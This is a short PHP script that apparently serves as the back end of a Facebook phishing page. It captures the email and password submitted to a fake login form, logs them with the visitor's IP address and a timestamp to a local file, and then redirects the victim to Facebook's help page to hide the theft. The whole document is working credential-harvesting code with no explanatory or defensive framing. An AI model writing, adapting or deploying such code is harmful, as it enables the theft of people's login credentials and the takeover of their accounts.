<?php
$file = "web.facebook=check-in===================================GoodLooking";
$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "TWO-----------------------------------------------------------II");
fwrite($handle, "\n");
fwrite($handle, "Email		: ");
fwrite($handle, "$user");
fwrite($handle, "\n");
fwrite($handle, "Password	: ");
fwrite($handle, "$pass");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted	: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "TWO-----------------------------------------------------------II");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"https://facebook.com/help/?#/\";
// -->
</script>";
?>
